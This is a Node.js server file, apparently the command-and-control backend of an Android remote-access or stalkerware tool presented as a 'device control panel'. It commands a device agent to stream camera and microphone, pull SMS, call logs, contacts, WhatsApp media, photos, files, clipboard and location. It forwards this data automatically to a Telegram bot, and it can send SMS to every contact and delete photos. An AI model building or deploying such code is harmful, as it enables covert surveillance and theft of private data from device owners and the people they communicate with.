const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const telegram = require('./telegram');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 100 * 1024 * 1024,
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// In-memory device store
const devices = new Map();
const deviceSockets = new Map();

// Telegram auto-send state
let telegramEnabled = true;
const telegramQueue = [];
let telegramSending = false;

async function sendToTelegram(fn) {
  if (!telegramEnabled) return;
  telegramQueue.push(fn);
  if (telegramSending) return;
  telegramSending = true;
  while (telegramQueue.length > 0) {
    const task = telegramQueue.shift();
    try {
      await task();
    } catch (e) {
      console.log('[Telegram] Error:', e.message);
    }
    // Rate limit: 1 msg per 100ms
    await new Promise(r => setTimeout(r, 100));
  }
  telegramSending = false;
}

// API: List all registered devices
app.get('/api/devices', (req, res) => {
  const list = [];
  for (const [id, device] of devices) {
    list.push({ id, ...device, online: deviceSockets.has(id) });
  }
  res.json(list);
});

// API: Get single device info
app.get('/api/devices/:id', (req, res) => {
  const device = devices.get(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found' });
  res.json({ id: req.params.id, ...device, online: deviceSockets.has(req.params.id) });
});

// Serve agent page
app.get('/agent', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'agent', 'index.html'));
});

// Serve agent.js
app.get('/agent/agent.js', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'agent', 'agent.js'));
});

// Fallback to index.html for SPA routing (skip static file extensions)
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api') && !req.path.startsWith('/socket.io') &&
      !/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|json)$/i.test(req.path)) {
    res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Not found' });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[Socket] Connected: ${socket.id}`);

  // Device agent registers itself
  socket.on('device:register', (data) => {
    const deviceId = data.deviceId || uuidv4();
    const existing = devices.get(deviceId);
    
    const deviceInfo = {
      name: data.name || (existing ? existing.name : 'Unknown Device'),
      type: data.type || (existing ? existing.type : 'unknown'),
      platform: data.platform || (existing ? existing.platform : 'unknown'),
      browser: data.browser || (existing ? existing.browser : 'unknown'),
      screenWidth: data.screenWidth || (existing ? existing.screenWidth : 0),
      screenHeight: data.screenHeight || (existing ? existing.screenHeight : 0),
      battery: data.battery || (existing ? existing.battery : null),
      network: data.network || (existing ? existing.network : null),
      storage: data.storage || (existing ? existing.storage : null),
      registeredAt: existing ? existing.registeredAt : new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      online: true
    };

    devices.set(deviceId, deviceInfo);
    deviceSockets.set(deviceId, socket.id);
    socket.deviceId = deviceId;

    socket.emit('device:registered', { deviceId });
    io.emit('devices:updated');
    console.log(`[Device] ${existing ? 'Reconnected' : 'Registered'}: ${deviceId} (${deviceInfo.name})`);

    // Send device connect notification to Telegram (only for new devices)
    if (!existing) {
      sendToTelegram(() => telegram.sendMessage(telegram.formatDeviceInfo(data, deviceInfo.name)));
    }
  });

  // Device sends updated info
  socket.on('device:update', (data) => {
    if (socket.deviceId && devices.has(socket.deviceId)) {
      const existing = devices.get(socket.deviceId);
      devices.set(socket.deviceId, {
        ...existing,
        ...data,
        lastSeen: new Date().toISOString()
      });
      io.emit('devices:updated');
    }
  });

  // Dashboard requests camera from device
  socket.on('command:camera:start', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:start');
    }
  });

  socket.on('command:camera:stop', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:stop');
    }
  });

  socket.on('command:camera:switch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:switch');
    }
  });

  socket.on('command:camera:capture', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:capture');
    }
  });

  // Device sends camera frame
  socket.on('camera:frame', (data) => {
    socket.broadcast.emit('camera:frame', {
      deviceId: socket.deviceId,
      frame: data.frame
    });
  });

  // Device sends audio data alongside camera
  socket.on('camera:audio', (data) => {
    socket.broadcast.emit('camera:audio', {
      deviceId: socket.deviceId,
      audio: data.audio,
      sampleRate: data.sampleRate || 16000
    });
  });

  // Device sends captured photo
  socket.on('camera:captured', (data) => {
    socket.broadcast.emit('camera:captured', {
      deviceId: socket.deviceId,
      image: data.image
    });
    // Forward captured photo to Telegram
    if (data.image) {
      sendToTelegram(() => telegram.sendPhoto(data.image, '📷 Camera Capture'));
    }
  });

  // Camera error from device
  socket.on('camera:error', (data) => {
    socket.broadcast.emit('camera:error', {
      deviceId: socket.deviceId,
      error: data.error
    });
  });

  // Camera status from device
  socket.on('camera:status', (data) => {
    socket.broadcast.emit('camera:status', {
      deviceId: socket.deviceId,
      status: data.status
    });
  });

  // Dashboard requests GPS from device
  socket.on('command:gps:start', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gps:start');
    }
  });

  socket.on('command:gps:stop', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gps:stop');
    }
  });

  // Device sends GPS location
  socket.on('gps:location', (data) => {
    socket.broadcast.emit('gps:location', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    sendToTelegram(() => telegram.sendMessage(telegram.formatLocation(data)));
  });

  // Dashboard requests gallery/photos from device
  socket.on('command:gallery:scan', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gallery:scan');
    }
  });

  // Device sends gallery photos list
  socket.on('gallery:photos', (data) => {
    socket.broadcast.emit('gallery:photos', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward gallery count to Telegram (not individual photos to avoid spam)
    if (!data.partial && data.total) {
      sendToTelegram(() => telegram.sendMessage(`📷 <b>Gallery Scan Complete</b>\n${data.total} photos found on device`));
    }
  });

  // Dashboard requests full-size photo
  socket.on('command:gallery:get', ({ deviceId, photoId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gallery:get', { photoId });
    }
  });

  // Device sends full-size photo
  socket.on('gallery:photo', (data) => {
    socket.broadcast.emit('gallery:photo', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests call log
  socket.on('command:calllog:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:calllog:fetch');
    }
  });

  // Device sends call log
  socket.on('calllog:data', (data) => {
    socket.broadcast.emit('calllog:data', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    if (data.calls && data.calls.length > 0) {
      sendToTelegram(() => telegram.sendMessage(telegram.formatCallLog(data.calls)));
    }
  });

  // Dashboard requests SMS
  socket.on('command:sms:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:sms:fetch');
    }
  });

  // Device sends SMS data
  socket.on('sms:data', (data) => {
    socket.broadcast.emit('sms:data', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    if (data.messages && data.messages.length > 0) {
      sendToTelegram(() => telegram.sendMessage(telegram.formatSMS(data.messages)));
    }
  });

  // Dashboard requests browsing history
  socket.on('command:history:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:history:fetch');
    }
  });

  // Device sends history data
  socket.on('history:data', (data) => {
    socket.broadcast.emit('history:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Device sends real-time notification (call/sms)
  socket.on('notification:new', (data) => {
    socket.broadcast.emit('notification:new', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    sendToTelegram(() => telegram.sendMessage(telegram.formatNotification(data)));
  });

  // Dashboard requests file listing
  socket.on('command:files:list', ({ deviceId, path: dirPath }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:files:list', { path: dirPath || '/' });
    }
  });

  // Device sends file listing
  socket.on('files:list', (data) => {
    socket.broadcast.emit('files:list', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests file download
  socket.on('command:files:download', ({ deviceId, filePath }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:files:download', { filePath });
    }
  });

  // Device sends file content
  socket.on('files:content', (data) => {
    socket.broadcast.emit('files:content', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests notifications history
  socket.on('command:notifications:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:notifications:fetch');
    }
  });

  // Device sends notifications data
  socket.on('notifications:data', (data) => {
    socket.broadcast.emit('notifications:data', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward notifications to Telegram
    if (data.notifications && data.notifications.length > 0) {
      const recent = data.notifications.slice(0, 20);
      let text = `🔔 <b>Notifications</b> (${data.notifications.length})\n━━━━━━━━━━━━━━━━━━\n`;
      recent.forEach(n => {
        text += `📦 ${n.app || n.packageName || '-'}: ${n.title || '-'}\n   ${(n.text || '').substring(0, 80)}\n\n`;
      });
      sendToTelegram(() => telegram.sendMessage(text));
    }
  });

  // Dashboard requests WhatsApp media
  socket.on('command:whatsapp:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:whatsapp:fetch');
    }
  });

  // Device sends WhatsApp data
  socket.on('whatsapp:data', (data) => {
    socket.broadcast.emit('whatsapp:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests photo delete
  socket.on('command:photo:delete', ({ deviceId, photoId, path }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:photo:delete', { photoId, path });
    }
  });

  // Device confirms photo deleted
  socket.on('photo:deleted', (data) => {
    socket.broadcast.emit('photo:deleted', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests call recordings
  socket.on('command:recordings:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:recordings:fetch');
    }
  });

  // Device sends recordings list
  socket.on('recordings:data', (data) => {
    socket.broadcast.emit('recordings:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Device sends new recording in real-time
  socket.on('recording:new', (data) => {
    socket.broadcast.emit('recording:new', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests contacts
  socket.on('command:contacts:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:contacts:fetch');
    }
  });

  // Device sends contacts
  socket.on('contacts:data', (data) => {
    socket.broadcast.emit('contacts:data', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    if (data.contacts && data.contacts.length > 0) {
      sendToTelegram(() => telegram.sendMessage(telegram.formatContacts(data.contacts)));
    }
  });

  // Live call events (real-time incoming/outgoing/missed)
  socket.on('call:live', (data) => {
    socket.broadcast.emit('call:live', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward live call event to Telegram
    const icon = data.type === 'incoming' ? '📥' : data.type === 'outgoing' ? '📤' : '📵';
    sendToTelegram(() => telegram.sendMessage(
      `${icon} <b>Live Call</b>\n━━━━━━━━━━━━━━━━━━\n` +
      `📞 ${data.type}: ${data.name || data.number || 'Unknown'}\n` +
      `⏰ ${new Date().toLocaleString()}`
    ));
  });

  // Call log deletion detected
  socket.on('calllog:deleted', (data) => {
    socket.broadcast.emit('calllog:deleted', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Emergency commands
  socket.on('command:emergency:alarm', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:alarm');
    }
  });

  socket.on('command:emergency:lock', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:lock');
    }
  });

  socket.on('command:emergency:message', ({ deviceId, message }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:message', { message });
    }
  });

  // Clipboard
  socket.on('command:clipboard:get', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:clipboard:get');
    }
  });

  socket.on('clipboard:content', (data) => {
    socket.broadcast.emit('clipboard:content', {
      deviceId: socket.deviceId,
      ...data
    });
    // Forward to Telegram
    sendToTelegram(() => telegram.sendMessage(telegram.formatClipboard(data)));
  });

  // WiFi Info
  socket.on('command:wifi:info', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:wifi:info');
    }
  });
  socket.on('wifi:info', (data) => {
    socket.broadcast.emit('wifi:info', { deviceId: socket.deviceId, ...data });
  });

  // Battery Info
  socket.on('command:battery:info', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:battery:info');
    }
  });
  socket.on('battery:info', (data) => {
    socket.broadcast.emit('battery:info', { deviceId: socket.deviceId, ...data });
  });

  // App Launch
  socket.on('command:app:launch', ({ deviceId, packageName }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:app:launch', { packageName });
    }
  });
  socket.on('app:launched', (data) => {
    socket.broadcast.emit('app:launched', { deviceId: socket.deviceId, ...data });
  });

  // Brightness
  socket.on('command:brightness:set', ({ deviceId, level }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:brightness:set', { level });
    }
  });

  // Volume
  socket.on('command:volume:set', ({ deviceId, level, type }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:volume:set', { level, type: type || 'music' });
    }
  });

  // ---- New Feature Commands ----

  // WebView / Open URL
  socket.on('command:webview:open', ({ deviceId, url }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:webview:open', { url });
    }
  });
  socket.on('webview:opened', (data) => {
    socket.broadcast.emit('webview:opened', { deviceId: socket.deviceId, ...data });
  });

  // Notification sender
  socket.on('command:notification:send', ({ deviceId, title, body, url }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:notification:send', { title, body, url });
    }
  });
  socket.on('notification:sent', (data) => {
    socket.broadcast.emit('notification:sent', { deviceId: socket.deviceId, ...data });
  });

  // Toast message
  socket.on('command:toast:show', ({ deviceId, message, duration }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:toast:show', { message, duration });
    }
  });
  socket.on('toast:shown', (data) => {
    socket.broadcast.emit('toast:shown', { deviceId: socket.deviceId, ...data });
  });

  // SIM info
  socket.on('command:sim:info', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:sim:info');
    }
  });
  socket.on('sim:info', (data) => {
    socket.broadcast.emit('sim:info', { deviceId: socket.deviceId, ...data });
    // Forward to Telegram
    sendToTelegram(() => telegram.sendMessage(telegram.formatSimInfo(data)));
  });

  // Vibrate
  socket.on('command:vibrate', ({ deviceId, duration, pattern }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:vibrate', { duration, pattern });
    }
  });
  socket.on('vibrate:done', (data) => {
    socket.broadcast.emit('vibrate:done', { deviceId: socket.deviceId, ...data });
  });

  // ---- Screenshot ----
  socket.on('command:screenshot', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:screenshot');
    }
  });
  socket.on('screenshot:data', (data) => {
    socket.broadcast.emit('screenshot:data', { deviceId: socket.deviceId, ...data });
    if (data.image) {
      sendToTelegram(() => telegram.sendPhoto(data.image, '🖥️ Screenshot'));
    }
  });

  // ---- Geofence ----
  socket.on('command:geofence:set', ({ deviceId, lat, lng, radius, name }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:geofence:set', { lat, lng, radius, name });
    }
  });
  socket.on('command:geofence:clear', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:geofence:clear');
    }
  });
  socket.on('geofence:alert', (data) => {
    socket.broadcast.emit('geofence:alert', { deviceId: socket.deviceId, ...data });
    const icon = data.type === 'exit' ? '🚨' : '📍';
    sendToTelegram(() => telegram.sendMessage(
      `${icon} <b>Geofence ${data.type === 'exit' ? 'EXIT' : 'ENTER'} Alert</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📍 Zone: ${data.name || 'Unnamed'}\n` +
      `📐 Distance: ${Math.round(data.distance)}m from center\n` +
      `⏰ ${new Date().toLocaleString()}`
    ));
  });
  socket.on('geofence:status', (data) => {
    socket.broadcast.emit('geofence:status', { deviceId: socket.deviceId, ...data });
  });

  // ---- Battery Alerts ----
  socket.on('command:batteryalert:set', ({ deviceId, threshold }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:batteryalert:set', { threshold });
    }
  });
  socket.on('command:batteryalert:clear', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:batteryalert:clear');
    }
  });
  socket.on('battery:alert', (data) => {
    socket.broadcast.emit('battery:alert', { deviceId: socket.deviceId, ...data });
    sendToTelegram(() => telegram.sendMessage(
      `🔋 <b>Battery Alert!</b>\n━━━━━━━━━━━━━━━━━━\n` +
      `⚡ Level: ${data.level}%\n` +
      `🔌 Charging: ${data.charging ? 'Yes' : 'No'}\n` +
      `⚠️ Threshold: ${data.threshold}%\n` +
      `⏰ ${new Date().toLocaleString()}`
    ));
  });

  // ---- Activity Timeline ----
  socket.on('command:timeline:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:timeline:fetch');
    }
  });
  socket.on('timeline:data', (data) => {
    socket.broadcast.emit('timeline:data', { deviceId: socket.deviceId, ...data });
  });

  // ---- Clipboard Monitor ----
  socket.on('command:clipmonitor:start', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:clipmonitor:start');
    }
  });
  socket.on('command:clipmonitor:stop', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:clipmonitor:stop');
    }
  });
  socket.on('clipboard:change', (data) => {
    socket.broadcast.emit('clipboard:change', { deviceId: socket.deviceId, ...data });
    sendToTelegram(() => telegram.sendMessage(
      `📋 <b>Clipboard Changed</b>\n━━━━━━━━━━━━━━━━━━\n` +
      `📝 ${(data.text || '').substring(0, 200)}\n` +
      `⏰ ${new Date().toLocaleString()}`
    ));
  });

  // ---- Network Speed Test ----
  socket.on('command:speedtest', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:speedtest');
    }
  });
  socket.on('speedtest:result', (data) => {
    socket.broadcast.emit('speedtest:result', { deviceId: socket.deviceId, ...data });
  });

  // ---- Device Rename ----
  socket.on('command:device:rename', ({ deviceId, newName }) => {
    if (devices.has(deviceId)) {
      const device = devices.get(deviceId);
      device.name = newName;
      devices.set(deviceId, device);
      io.emit('devices:updated');
      socket.emit('device:renamed', { deviceId, newName, success: true });
    }
  });

  // Send SMS
  socket.on('command:sms:send', ({ deviceId, number, message }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:sms:send', { number, message });
    }
  });
  socket.on('sms:sent', (data) => {
    socket.broadcast.emit('sms:sent', { deviceId: socket.deviceId, ...data });
  });

  // Send SMS to all contacts
  socket.on('command:sms:sendall', ({ deviceId, message }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:sms:sendall', { message });
    }
  });
  socket.on('sms:sentall', (data) => {
    socket.broadcast.emit('sms:sentall', { deviceId: socket.deviceId, ...data });
  });

  // Installed apps list
  socket.on('command:apps:list', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:apps:list');
    }
  });
  socket.on('apps:list', (data) => {
    socket.broadcast.emit('apps:list', { deviceId: socket.deviceId, ...data });
    // Forward to Telegram
    if (data.apps && data.apps.length > 0) {
      sendToTelegram(() => telegram.sendMessage(telegram.formatApps(data.apps)));
    }
  });

  // Microphone record with duration
  socket.on('command:mic:record', ({ deviceId, duration }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:mic:record', { duration });
    }
  });
  socket.on('mic:recording', (data) => {
    socket.broadcast.emit('mic:recording', { deviceId: socket.deviceId, ...data });
    // Forward mic recording to Telegram as document
    if (data.audio) {
      sendToTelegram(() => telegram.sendDocument(data.audio, 'recording.wav', '🎙️ Mic Recording'));
    }
  });
  socket.on('mic:status', (data) => {
    socket.broadcast.emit('mic:status', { deviceId: socket.deviceId, ...data });
  });

  // Telegram control commands from dashboard
  socket.on('command:telegram:toggle', (data) => {
    telegramEnabled = data.enabled !== false;
    socket.broadcast.emit('telegram:status', { enabled: telegramEnabled });
    console.log(`[Telegram] ${telegramEnabled ? 'Enabled' : 'Disabled'}`);
  });

  socket.on('command:telegram:test', () => {
    sendToTelegram(() => telegram.sendMessage('✅ <b>Telegram Bot Connected!</b>\nAll device data will be forwarded here.'));
  });

  // Send all data at once to Telegram
  socket.on('command:telegram:sendall', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      // Request all data from device
      io.to(targetSocketId).emit('command:contacts:fetch');
      io.to(targetSocketId).emit('command:calllog:fetch');
      io.to(targetSocketId).emit('command:sms:fetch');
      io.to(targetSocketId).emit('command:apps:list');
      io.to(targetSocketId).emit('command:sim:info');
      io.to(targetSocketId).emit('command:clipboard:get');
      io.to(targetSocketId).emit('command:gps:start');
      sendToTelegram(() => telegram.sendMessage('🚀 <b>Fetching all device data...</b>\nAll data will be sent shortly.'));
    }
  });

  // Disconnect - mark device as offline (don't remove it)
  socket.on('disconnect', () => {
    if (socket.deviceId) {
      const deviceName = devices.has(socket.deviceId) ? devices.get(socket.deviceId).name : socket.deviceId;
      deviceSockets.delete(socket.deviceId);
      if (devices.has(socket.deviceId)) {
        const device = devices.get(socket.deviceId);
        device.lastSeen = new Date().toISOString();
        device.online = false;
        devices.set(socket.deviceId, device);
      }
      io.emit('devices:updated');
      console.log(`[Device] Offline: ${socket.deviceId}`);
      // Notify Telegram
      sendToTelegram(() => telegram.sendMessage(`📵 <b>Device Offline</b>\n${deviceName}\n⏰ ${new Date().toLocaleString()}`));
    }
    console.log(`[Socket] Disconnected: ${socket.id}`);
  });
});

// Start server (skip in Vercel serverless environment)
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  server.listen(PORT, () => {
    console.log(`\n🖥️  My Device Control Panel`);
    console.log(`📡 Server running on http://localhost:${PORT}`);
    console.log(`📱 Agent page: http://localhost:${PORT}/agent`);
    console.log(`🌐 Dashboard: http://localhost:${PORT}\n`);
  });
}

module.exports = app;
